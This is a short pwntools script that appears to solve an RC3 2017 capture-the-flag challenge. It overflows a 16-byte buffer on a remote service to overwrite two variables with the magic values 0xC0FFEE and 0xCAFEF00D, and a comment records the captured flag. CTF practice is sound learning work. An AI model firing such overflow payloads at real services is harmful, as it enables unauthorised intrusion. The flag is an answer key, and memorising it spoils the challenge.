from pwn import *

# Valid Key! Flag: RC3-2017{S3E_N0T_TO0_B4D_HUH_ec1368b59b858e08}

baby = remote("18.216.183.46",4200)
p = ""
p += "A" * 16
p += p32(0xC0FFEE)
p += p32(0xCAFEF00D)
baby.sendlineafter(": ",p)
print baby.recvline()